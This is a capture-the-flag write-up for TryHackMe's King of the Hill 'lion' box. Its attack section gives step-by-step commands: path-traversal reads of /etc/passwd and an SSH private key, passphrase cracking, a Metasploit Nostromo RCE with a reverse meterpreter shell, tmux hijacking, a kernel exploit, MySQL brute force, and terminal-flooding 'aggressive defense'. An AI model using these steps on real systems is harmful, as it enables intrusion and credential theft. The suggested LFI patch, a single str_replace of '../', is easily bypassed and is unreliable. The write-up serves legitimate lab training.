---
layout: post
title: TryHackMe King of the Hill - lion
summary:  A complete look at the lion box from TryHackMe's King of the Hill mode. This includes all possible ways to get in, all privilege escalations, all flags locations and tips to gain as much point as possible by being king. Huge thanks to goldshay135, RacooNinja AKA */bin/cup* and xcth from the BadByte community for their help on this!
date: 2020-07-11
author: Noxtal & the BadByte Community
categories: writeups
thumbnail:  tryhackme
tags:
 - tryhackme
 - koth
 - lfi
 - nostromo
 - ssh2john
 - file upload
 - tmux
 - mysql
 - defense
 - agressive defense
---

 A complete look at the lion box from TryHackMe's King of the Hill mode. This includes all possible ways to get in, all privilege escalations, all flags locations and tips to gain as much point as possible by being king.

 To get as much information, I have asked for help in my hacking community, the [BadByte community](https://discord.gg/CDACNFg). Join it too if you are looking for a nice place to hang out with other hackers and play KOTH! Invite link [here](https://discord.gg/CDACNFg)

 Huge thanks to goldshay135, RacooNinja AKA */bin/cup* and xcth from the [BadByte community](https://discord.gg/CDACNFg) for their help on this!

-----

### Table of Contents
- [Attacking](#attacking)
  - [Reconnaissance](#reconnaissance)
  - [Penetration Testing](#penetration-testing)
    - [Port 5555: Local File Inclusion](#port-5555-local-file-inclusion)
    - [Port 8080: Outdated Version of Nostromo (RCE)](#port-8080-outdated-version-of-nostromo-rce)
    - [Port 80: Insecure File Upload](#port-80-insecure-file-upload)
  - [Privilege Escalation](#privilege-escalation)
  - [Lateral Movement (Pivoting)](#lateral-movement-pivoting)
    - [Become King](#become-king)
    - [Flags](#flags)
- [Defending](#defending)
  - [Patching](#patching)
    - [Nostromo RCE Patch](#nostromo-rce-patch)
    - [LFI Patch](#lfi-patch)
    - [Insecure File Upload Patch](#insecure-file-upload-patch)
  - [Aggressive Defense](#aggressive-defense)
- [Conclusion](#conclusion)

# Attacking
## Reconnaissance
Let's start with a simple recon on the box. The principal scans I usually run are described in more detail in my [spacejam writeup](/writeups/2020/06/16/tryhackme-koth-spacejam/).

For the sake of the writeup, I ran an aggressive `nmap` scan and scanned every port. Below is the result.

```
# Nmap 7.80 scan initiated Sat Jul 11 15:18:25 2020 as: nmap -vv -A -p- -oN nmap-complete.log 10.10.174.7
Nmap scan report for 10.10.174.7
Host is up, received reset ttl 61 (0.28s latency).
Scanned at 2020-07-11 15:18:25 UTC for 394s
Not shown: 65528 closed ports
Reason: 65528 resets
PORT      STATE SERVICE    REASON         VERSION
80/tcp    open  http       syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp  open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:48:b1:90:10:f1:9e:36:4a:e1:36:4a:a9:f0:72:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCdx7sggQLnRX7Rz+rPAryzhbj43oXIgdtiRUD0sdFq8toOoVhvLjJdTSS03tgg7dgbMoHxAk4ajDp9kw+v7Yg6cFGzIOd+caCY80w1NAuDgKK9wODnLfIhNsRau3+8A+AEErTWEfxbWBcU0FHJkJKWk6qpUX0nid9WmPith1xS5Ul/9Yfq72vxl+McAbZIQb+w1QNhth0BZp/NSuG85szoYdL/exGuKHOG4yY7MecsKnDHDZR5OcoKSpGIlQlj17mBnppyRvl+GJyavoZjsm0f+XGUrY+eEEY+y1oJ/09q8qUH8BJY3C1v9fMWsx7vndAvB2Arwwacx2ETa1W5KzR
|   256 56:2a:8a:33:cb:aa:22:72:28:1e:a1:6a:ff:5a:99:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNsUdgOVsYGrO4jPdqhFgzdt3MD9YMuUfOhFi26DqENL5xp8k1Jby9vC/SU9GK/6IDM5lvQ5SKTJIdP8hsYlNPw=
|   256 51:df:b6:32:a9:5f:46:1a:42:3b:7f:58:94:47:7c:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICuTCXEgtaVLmIsgxQaTqAOx4E5hEs+EK8lF8Df0nd4Z
3306/tcp  open  mysql      syn-ack ttl 61 MySQL 5.7.19-0ubuntu0.16.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.19-0ubuntu0.16.04.1
|   Thread ID: 5
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, ConnectWithDatabase, LongPassword, DontAllowDatabaseTableColumn, IgnoreSigpipes, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, FoundRows, Support41Auth, SupportsCompression, LongColumnFlag, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolNew, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: B?=do#|UOI\x0B(734 q3]'
|_  Auth Plugin Name: mysql_native_password
5555/tcp  open  http       syn-ack ttl 61 nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8080/tcp  open  http       syn-ack ttl 61 nostromo 1.9.6
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: Welcome
9999/tcp  open  abyss?     syn-ack ttl 61
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 11 Jul 2020 19:22:59 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 11 Jul 2020 19:22:58 GMT
|_    Content-Length: 0
24964/tcp open  tcpwrapped syn-ack ttl 61
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=7/11%Time=5F09D953%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2011\x20Jul\x2020
SF:20\x2019:22:58\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2011\x20Jul\x202020\x2019:2
SF:2:59\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2011\x20Jul\x202020\x2019:22:59
SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/11%OT=80%CT=1%CU=43482%PV=Y%DS=4%DC=T%G=Y%TM=5F09D9C
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=RD%II=I%TS=8)SE
OS:Q(SP=100%GCD=1%ISR=10C%TI=Z%CI=RD%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7
OS:%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W
OS:2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NN
OS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.007 days (since Sat Jul 11 15:15:36 2020)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   82.89 ms  10.2.0.1
2   ... 3
4   229.14 ms 10.10.174.7

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 11 15:24:59 2020 -- 1 IP address (1 host up) scanned in 394.39 seconds
```

Next, I ran *gobuster*, below is the result.

```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/upload (Status: 301)
```

Let's take a closer look at the ports found by *nmap* and at the `/upload/` directory found by *gobuster*, and attempt to get a shell inside.

## Penetration Testing
### Port 5555: Local File Inclusion
On port 5555, we have got what seems to be a typical blog. By navigating through the pages, we can find that the `page` variable is the one defining on which page we are. 

![Port 5555 Screenshot](https://i.imgur.com/VyJYSKn.png)

This could be a gateway to LFI if the code managing those pages are insecure enough. Let's try to leak `/etc/passwd`. This is the query we need to use: `http://MACHINE_IP:5555/?page=../../../etc/passwd`.

![Leaking /etc/passwd](https://i.imgur.com/9nazxDf.png)

This has worked! Let's now try to leak more sensitive files like SSH keys. Since this is "Gloria's blog", we can expect there is a user named gloria in the machine. Let's use the following query to leak her SSH private key: `http://MACHINE_IP:5555/?page=../../../home/gloria/.ssh/id_rsa`.

![Leaking SSH key](https://i.imgur.com/Dwn6L7O.png)

This has worked too! We can now save that to a file. By convention, you should name it `id_rsa`. Make sure the file's permissions are the right ones using chmod: `chmod 400 id_rsa`. If you don't do that step, you might get problems with SSH. If we try to connect to gloria through SSH (`ssh -i id_rsa gloria@MACHINE_IP`), we, unfortunately, need to enter a passphrase.

Let's try to crack that passphrase using *ssh2john* and *john* (AKA *JohnTheRipper*).

```bash
ssh2john id_rsa > john
john -w=/usr/share/wordlists/rockyou.txt john
```

Fortunately, we get the passphrase quickly using those commands. Try it out yourself!

We can now SSH into gloria. Don't forget that the port for SSH is 1337 (see the [nmap scan](#reconnaissance)) instead of the default port (22).
```bash
ssh -i id_rsa -p 1337 gloria@MACHINE_IP
```

We have now got a shell!

![Getting a shell through SSH](https://i.imgur.com/rwFByiE.png)

### Port 8080: Outdated Version of Nostromo (RCE)
On port 8080, we can only find a message telling us there is nothing there. This is indeed a little bit odd but there must be a reason why this is there. 

![Nothing here](https://i.imgur.com/bwnrNpw.png)

By looking back at the nmap scan, we can find that it is a Nostromo 1.9.6 server.  Fortunately for us, this version is not only outdated, but it also has a Remote Code Execution vulnerability. This can be found through searchsploit (`searchsploit nostromo 1.9.6`). According to the results of that command, we could use the builtin Python exploit. Though it needs a bit of tinkering to work. Let's open Metasploit (`msfconsole`) and search for *nostromo 1.9.6*.

![Searching for exploits](https://i.imgur.com/b20PdOJ.png)

Luckily, there is a Metasploit module disponible for that exploit. Let's try to use it against the box. [Here](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/nostromo_code_exec.md) is the documentation for the `exploit/multi/http/nostromo_code_exec` module. By following the instructions below, you should get a shell as gloria. Those commands are taken from the documentation:
  1. Use the exploit: `use exploit/multi/http/nostromo_code_exec`
  2. Set the port: `set rport 8080`
  3. Set the box IP: `set rhost <MACHINE_IP>`
  4. Check if the box is vulnerable: `check`
  5. Set the payload to a reverse TCP shell: `set payload linux/x86/meterpreter/reverse_tcp`
  6. Set your local IP: `set lhost tun0`
  7. Pop a shell: `exploit`

### Port 80: Insecure File Upload
By looking at the *gobuster* scan results, we can find a `/upload/` directory on port 80. When we get on it, we see a typical file upload page. 

![Upload page](https://i.imgur.com/HK75bcF.png)

If we upload an image, we can find it is really hard to get it back. Actually, a unique ID is generated for each of the files, which makes the task really harder to pop a shell that way. 

A thing we could try is to combine every other vulnerability mentioned before to exploit this file upload:
1. Upload a shell
2. Find it using the RCE
3. Achieve Script Injection using the LFI and specifying the path

As you have probably noticed, this process would be really long. Though there is a way simpler method that can be used, it necessitates blind guesses or already having a shell. If we try to send every shell from the Reverse Shell Cheatsheet by pentestmonkey (more on it in other of my writeups), we can see that the *Perl* shell is going to be triggered as soon as we upload it. This behaviour can seem odd until we reverse engineering.

Here it is, it can be found by already having a shell:

```php
<?php
$filename   = uniqid() . "-" . time();
$extension  = pathinfo( $_FILES["fileToUpload"]["name"], PATHINFO_EXTENSION );
$basename   = $filename . '.' . $extension; 
$target_dir = "uploads/";
$target_file = $target_dir . $basename;
$uploadOk = 1;

if(isset($_POST["submit"])) {

// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}
// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

exec("/usr/bin/perl " . $target_file);
}
?>
```

Take a look at the last line. That line means that every file uploaded is going to be ran with Perl. That's what makes our Perl reverse shell work!

## Privilege Escalation
To find a *privesc*, I used linpeas. "Linpeas" stands for Linux Privilege Escalation Awesome Script and has been developed by carlospolop. As the name suggests, it is an awesome script to find as many informations as possible about potential risks of vulnerabilities leading to a privilege escalation. After going through the logs, we can find that a `tmux` session is run by root in the `/.dev/` directory (which is not a default directory). 

![linpeas results](https://i.imgur.com/KTuiGKx.png)
![linpeas results 2](https://i.imgur.com/I9id7AL.png)

Let's try to hijack that session using the following command: `/usr/bin/tmux -S /.dev/session`. 

![Hijacking tmux](https://i.imgur.com/dOHGnW0.png)

That has worked successfully! Another way to *privesc* would be to use a kernel exploit (CVE-2017-16995). This can be achieved that way:
   1. Download [the exploit](https://github.com/gugronnier/CVE-2017-16995/blob/master/exploit-poc-pentest.c).
   1. Compile and build it: `gcc --static exploit-poc-pentest.c -o exploit-poc-pentest`.
   2. Send it to the machine.
   1. Make it the exploit executable and run it:  `chmod +x ./exploit-poc-pentest`, then `./exploit-poc-pentest`.

## Lateral Movement (Pivoting)
We are **root**! We now need to pivot and both find all the flags and become king to get as many points as possible.

### Become King
Here is a classical method to become king.
1. Make sure you have the root permissions (use the `whoami` command if you are not sure, but using the vulnerability exploited before you should be).
2. Replace the content of the king.txt file (*/root/king.txt*) with your username. This can be done easily using a simple echo command: `echo "USERNAME" > /root/king.txt`.
    * If you can't access the king file (*permission denied*), another player has doubtlessly used the *chattr* command to make the file immutable (explained in the next point). To remove that immutability flag, run the following command: `chattr -i /root/king.txt`.
3. Use the *chattr* to set an immutability flag on the king.txt file. This will disable every user (even root) to edit the file unless they run the last-mentioned command. The *chattr* command we need to use for that is the following: `chattr +i /root/king.txt`. Here the `+` means "add the attribute to the file" whilst the `-` in the command before meant the opposite. Right next to this sign, we specify the attribute. In our case, we use "i" for "immutable". Finally, we specify the file we want to affect (the king.txt file in this case). The file should now have another layer of protection to your advantage.

### Flags
Below are all 6 flags from this machine along with their encoding if needed.

| Flag Location                               | Encoding  |
|-------------------------------------------  |---------- |
| /home/gloria/user.txt                       |           |
| /home/marty/user.txt                        | Reversed  |
| /home/alex/user.txt                         | Rot13     |
| /root/.flag                                 |           |
| /opt/code/server.py                         |           |
| MySQL: db-> blog, table-> users, id-> 140   |           |

The MySQL password can be guessed fairly easily. If you can't find it, use hydra to brute force it with *rockyou.txt*.
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> mysql
```

# Defending 
## Patching
### Nostromo RCE Patch
To patch Nostromo, we would need to update it. Unfortunately, THM boxes are not connected to the Internet, hence the only way do to that is to upload a more recent version of it from our machine. Though there is a fairly simpler solution which consists of putting Nostromo down and running another server type (for instance, a Python http.server) on that port instead. This strategy could be used in real-life situations for maintenance, for example.

This is what I did: 
1. Find the directory Nostromo hosts online by enumerating. In that case it is `/var/nostromo/htdocs`.
2. Kill Nostromo.
  - List Nostromo (AKA `nhttpd`) processes: `ps aux | grep nhttpd`. 
  - Kill Nostromo using the PID found with the last command: `kill -9 <PID>`.
3. cd to the directory and run another server. I will be using the Python `http.server` module.
   -  `cd /var/nostromo/htdocs`
   -  `python3 -m http.server -b <MACHINE_IP> 8080`

With that method, you should have Nostromo patched.

### LFI Patch
The simpler LFI patch we can do for port 5555 consists of removing every `../` from the page variable. Here is the default PHP code running on that port:

```php
<?php include($_GET["page"]); ?>
```

We can use the PHP [str_replace](https://www.php.net/manual/fr/function.str-replace.php) function to replace every `../` in the page variable with nothing, thus removing those. Here is the patched PHP code:

```php
<?php include(str_replace("../","",$_GET["page"])); ?>
```

### Insecure File Upload Patch
As seen in the [section above](#port-80-insecure-file-upload), the last line of the PHP code managing the file upload on port 80 tries to run perl on the uploaded file. The simplest and by far quickest patch we can issue is to remove or comment that line.

## Aggressive Defense
A quick way to defend against other players while issuing fixes is through an aggressive defence. It basically consists of kicking players out and messing up their terminal. If you do so, you'll keep players out of the machine to later lock them out after patching the vulnerabilities.

Though, this is not the best thing to do in a KOTH game because the game can quickly become unfair. A KOTH game always needs to remain fun and fair for every player. That's why you need to run the following commands only if needed.

- Kick other players' shells:
  1. Get your pts number (`/dev/pts/x`) using `who`, `tty` or by looking at your current PID (`echo $$`) and then find it with `ps aux | grep pts`
  2. Use `ps aux | grep pts` to find every other pts.
  3. Use `kill -9 <PID>` to kill the process IDs of other pts to kill them.

- Breaking other players' pts:
  1. Get your pts number (`/dev/pts/x`) using `who`, `tty` or by looking at your current PID (`echo $$`) and then find it with `ps aux | grep pts`
  2. Use `cat /dev/urandom > /dev/pts/<OTHER_PTS_ID>` to *cat* random characters to another player's pts, thus breaking it.

# Conclusion
That's what we achieved to find on that box. Huge thanks to goldshay135, RacooNinja AKA */bin/cup* and xcth from the [BadByte community](https://discord.gg/CDACNFg) for their help on this! If you have any questions, feedback or other information I have not listed, feel free to contact me via [Twitter](https://twitter.com/noxtal_) or by commenting below.